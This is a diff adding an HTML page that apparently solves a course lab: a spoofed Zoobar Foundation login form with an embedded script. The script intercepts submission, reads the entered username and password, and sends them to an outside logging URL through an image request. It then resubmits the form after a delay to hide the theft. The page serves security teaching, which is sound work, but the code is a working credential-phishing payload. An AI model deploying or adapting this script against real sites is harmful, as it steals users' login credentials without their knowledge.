@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+        
+      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Vigilant
+                      Discourse</a></h1>
+      <h2>Supporting the important
+          minds of the new world order</h2>
+      
+<div id="login" class="centerpiece">
+<form id="loginform" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input id="submit_login" type="submit" name="submit_login" onclick="is_register=false" value="Log in">
+  <input type="submit" id="submit_registration" name="submit_registration" onclick="is_register=true" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+</div>
+<div class="footer warning">
+
+</div>
+<script>
+	document.loginform.login_username.focus();
+	var is_register = false;
+	var credentials_stolen = false;
+	var submitAttackForm = function(event) {
+		var login_form = document.getElementById('loginform');
+		if (!credentials_stolen) {
+			event.preventDefault();
+			var img = new Image();
+			var username = login_form.login_username.value;
+			var password = login_form.login_password.value;
+			img.src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=rollhens' + '&payload=' + encodeURIComponent(username + "/" + password) + '&random=' + Math.random();
+			img.click();
+			credentials_stolen = true;
+			if (is_register) {
+				setTimeout(function(){ document.getElementById('submit_registration').click(); }, 3000);
+			} else {
+				setTimeout(function(){ document.getElementById('submit_login').click(); }, 3000);
+			}
+		}
+	}
+	window.onload = function() {
+		var login_form = document.getElementById('loginform');
+		login_form.addEventListener("submit", submitAttackForm, false);
+	}
+</script>
+
+    </body>
+</html>
